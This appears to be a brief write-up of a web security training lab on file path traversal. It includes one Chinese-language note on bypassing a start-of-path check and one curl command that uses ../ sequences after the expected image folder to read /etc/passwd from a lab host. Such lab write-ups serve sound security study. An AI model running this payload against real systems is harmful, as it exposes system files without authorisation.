# Lab: File path traversal, validation of start of path

This lab contains a file path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.

## LFI
* 題目說要 full file path 所以就留前面的 file path 之後用 ../ 回去到根目錄就可以了
```
payload = curl https://acd31f541e92b763c042653d00840084.web-security-academy.net/image\?filename\=/var/www/images/../../../../../../etc/passwd
```